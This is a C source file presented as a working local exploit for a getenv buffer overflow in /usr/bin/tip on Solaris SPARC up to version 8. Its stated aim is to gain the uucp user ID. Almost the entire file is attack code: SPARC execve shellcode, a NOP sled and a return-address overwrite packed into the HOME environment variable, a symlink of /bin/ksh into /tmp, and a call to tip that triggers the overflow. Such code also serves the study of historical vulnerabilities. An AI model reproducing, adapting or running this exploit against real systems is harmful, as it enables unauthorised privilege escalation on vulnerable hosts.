/*
 * TILE: /usr/bin/tip solaris(sparc) xploit
 * 
 * CODER: ripe - <ripe@7a69ezine.org>
 * 
 * NOTE: This is a getenv buffer overflow in /usr/bin/tip. I base this
 *       xploit in /usr/bin/tip xploit programed by Pablo Sor for 
 *       Solaris(x86).
 *
 *       Using this exploit you can win uucp UID in Solaris <= 8.
 * 
 *       Gretz to 7a69ezine staff, and of ppl of #root(irc.irc-hispano.org).
 *       Oh! And to my mum.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define NOP 0xac15a16e
#define BUFSIZE 600

char shellcode[] = /* anathema <anathema@hack.co.za> */
/*  Don't need setuid(), i think.
 
"\x82\x10\x20\xca"                            mov 0xca, %g1              
"\x92\x1a\x40\x09"                            xor %o1, %o1, %o1          
"\x90\x0a\x40\x09"                            and %o1, %o1, %o0          
"\x91\xd0\x20\x08"                            ta 8                       
*/
  
  /* execve() */
"\x2d\x0b\xd8\x9a"                           /* sethi $0xbd89a, %l6        */
"\xac\x15\xa1\x6e"                           /* or %l6, 0x16e, %l6         */
"\x2f\x0b\xdc\xda"                           /* sethi $0xbdcda, %l7        */
"\x90\x0b\x80\x0e"                           /* and %sp, %sp, %o0          */
"\x92\x03\xa0\x08"                           /* add %sp, 8, %o1            */
"\x94\x1a\x80\x0a"                           /* xor %o2, %o2, %o2          */
"\x9c\x03\xa0\x10"                           /* add %sp, 0x10, %sp         */
"\xec\x3b\xbf\xf0"                           /* std %l6, [%sp - 0x10]      */
"\xdc\x23\xbf\xf8"                           /* st %sp, [%sp - 0x08]       */
"\xc0\x23\xbf\xfc"                           /* st %g0, [%sp - 0x04]       */
"\x82\x10\x20\x3b"                           /* mov $0x3b, %g1             */
"\x91\xd0\x20\x08";                          /* ta 8                       */

long get_sp(void)
{
    __asm__("mov %sp,%i0");
}

char *put_long(char *ptr, long value) {
  *ptr++=(char)(value>>24)&0xff;
  *ptr++=(char)(value>>16)&0xff;
  *ptr++=(char)(value>>8)&0xff;
  *ptr++=(char)(value>>0)&0xff;
  return(ptr);
}

int main(int argc, char **argv) {
  char bad_buf[BUFSIZE+1];
  char *ptr;
  int offset;
  int i;
  long ret;
  printf("/usr/bin/tip solaris(sparc) xploit By Ripe - <ripe@7a69ezine.org>\n");  if (argc<2) {
    printf("Usage:\n");
    printf("\t%s <offset>\n", argv[0]);
    exit(0);
  }
  printf("Creating simbolic link of /bin/ksh... ");
  if (symlink("/bin/ksh","/tmp/xx")==-1) {
    printf("ERROR\nAboring...");
    exit(-1);
  }
  printf("DONE\n");
  printf("Geting RET addr value... ");
  ret=get_sp();
  ret=ret+atoi(argv[1]);
  printf("DONE\n");
  printf("  Using ret= %x\n", ret);
  printf("Creating bad buf... ");
  memcpy(&bad_buf[0], "HOME=", 5);
  for(ptr=&bad_buf[5];ptr<(&bad_buf[BUFSIZE]-8);ptr=put_long(ptr, NOP));
  memcpy(&bad_buf[BUFSIZE]-(strlen(shellcode)+4), shellcode, strlen(shellcode));
  ptr=&bad_buf[BUFSIZE-4];
  put_long(ptr, ret);
  printf("DONE\n");
  printf("Seting HOME value... ");
  putenv(bad_buf);
  printf("DONE\n");
  printf("Exploting....\n");
  execl("/usr/bin/tip", "tip", "5", NULL);
  printf("Ummm. Something bad :-?\n");
}
